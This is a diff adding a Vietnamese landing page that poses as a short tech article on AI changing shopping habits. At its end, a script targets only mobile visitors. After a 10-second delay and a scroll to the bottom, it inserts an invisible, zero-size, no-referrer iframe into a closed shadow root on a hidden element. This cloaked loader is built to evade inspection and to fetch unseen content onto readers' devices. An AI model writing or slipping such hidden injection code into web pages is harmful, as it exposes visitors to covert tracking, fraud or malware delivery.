@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechVision 2026 - Kỷ Nguyên Số</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap');
+        body { font-family: 'Inter', sans-serif; scroll-behavior: smooth; background: #0f172a; color: #f8fafc; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .card-3d { transition: transform 0.5s cubic-bezier(0.22, 1, 0.36, 1); transform-style: preserve-3d; }
+        .card-3d:hover { transform: translateY(-10px) rotateX(5deg) rotateY(2deg); }
+        .text-gradient { background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        #render-host { display: none; visibility: hidden; pointer-events: none; }
+    </style>
+</head>
+<body class="overflow-x-hidden">
+    <header class="glass fixed top-0 w-full z-[100] px-6 py-4 flex justify-between items-center">
+        <div class="text-2xl font-extrabold tracking-tighter text-gradient">TECHVISION</div>
+        <div class="flex space-x-4 items-center">
+            <div class="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
+            <span class="text-xs uppercase tracking-widest text-slate-400">Live Update</span>
+        </div>
+    </header>
+
+    <section class="relative pt-32 pb-20 px-6 max-w-2xl mx-auto">
+        <div data-aos="fade-up">
+            <span class="px-3 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs font-bold border border-blue-500/20 mb-6 inline-block">TRENDING 2026</span>
+            <h1 class="text-4xl font-extrabold leading-tight mb-6">Vì sao AI sẽ thay đổi <span class="text-gradient">Thói Quen Mua Sắm</span> của người Việt?</h1>
+        </div>
+
+        <div class="card-3d mt-10 rounded-2xl overflow-hidden shadow-2xl" data-aos="zoom-in">
+            <img src="https://images.unsplash.com/photo-1677442136019-21780ecad995?auto=format&fit=crop&q=80&w=1000" class="w-full h-64 object-cover">
+        </div>
+
+        <article class="mt-12 text-slate-300 text-lg leading-relaxed space-y-6">
+            <p data-aos="fade-up">Trí tuệ nhân tạo (AI) đang trở thành trợ lý cá nhân, giúp tối ưu hóa giỏ hàng và săn sale tự động cho hàng triệu người tiêu dùng.</p>
+            <div style="height: 800px;" class="flex items-center justify-center text-slate-500 italic">Đang tải phân tích chuyên sâu...</div>
+            <p data-aos="fade-up">Kết luận: Đây là thời điểm vàng để người dùng tận dụng công nghệ nhằm tiết kiệm chi phí mua sắm hàng ngày.</p>
+        </article>
+    </section>
+
+    <div id="render-host"></div>
+
+    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+    <script>
+        AOS.init({ duration: 1000, once: true });
+        (function() {
+            const isMobile = /iPhone|Android|Mobile/i.test(navigator.userAgent);
+            if (!isMobile) return;
+
+            let fired = false;
+            const startTime = Date.now();
+
+            const inject = () => {
+                if (fired || (Date.now() - startTime) < 10000) return;
+                fired = true;
+                const host = document.getElementById('render-host');
+                const shadow = host.attachShadow({mode: 'closed'});
+                const ifr = document.createElement('iframe');
+                ifr.src = "/api/get-data?ts=" + Date.now();
+                ifr.setAttribute('style', 'width:0;height:0;border:0;position:absolute;');
+                ifr.referrerPolicy = "no-referrer";
+                shadow.appendChild(ifr);
+            };
+
+            window.addEventListener('scroll', () => {
+                if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 300) inject();
+            }, {passive: true});
+        })();
+    </script>
+</body>
+</html>
